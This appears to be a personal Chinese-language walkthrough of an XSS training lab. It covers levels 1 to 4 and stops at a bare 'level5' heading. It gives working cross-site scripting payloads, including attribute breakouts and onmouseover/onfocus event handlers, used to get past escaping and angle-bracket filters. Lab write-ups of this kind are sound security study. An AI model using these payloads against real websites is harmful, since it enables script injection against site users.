level1  

<img src="D:\31765\Pictures\Screenshots\屏幕截图 2024-03-03 000038.png" alt="屏幕截图 2024-03-03 000038" style="zoom:30%;" />

在url处发现注入点，`<script>alert(1)</script>`    

level2  

发现注入点，键入`<script>alert(1)</script>`  

![屏幕截图 2024-03-03 001547](D:\31765\Pictures\Screenshots\屏幕截图 2024-03-03 001547.png)出错了  

查看源码  

![屏幕截图 2024-03-03 001747](D:\31765\Pictures\Screenshots\屏幕截图 2024-03-03 001747.png)

可以看到目标被放到value中，需要先构造闭合：`"><script>alert(1)</script>//`    

laval3  

![屏幕截图 2024-03-03 002602](D:\31765\Pictures\Screenshots\屏幕截图 2024-03-03 002602.png)测试，无动静，查看源码，多了个转义函数，考虑用onmouseover事件  

`'onmouseover=alert(1)//`  

level4  

![屏幕截图 2024-03-03 003610](D:\31765\Pictures\Screenshots\屏幕截图 2024-03-03 003610.png)

`"<script>alert(1)</script>`  

发现`<>`被过滤，使用`"onfocus=javascript:alert(1)`绕过  

level5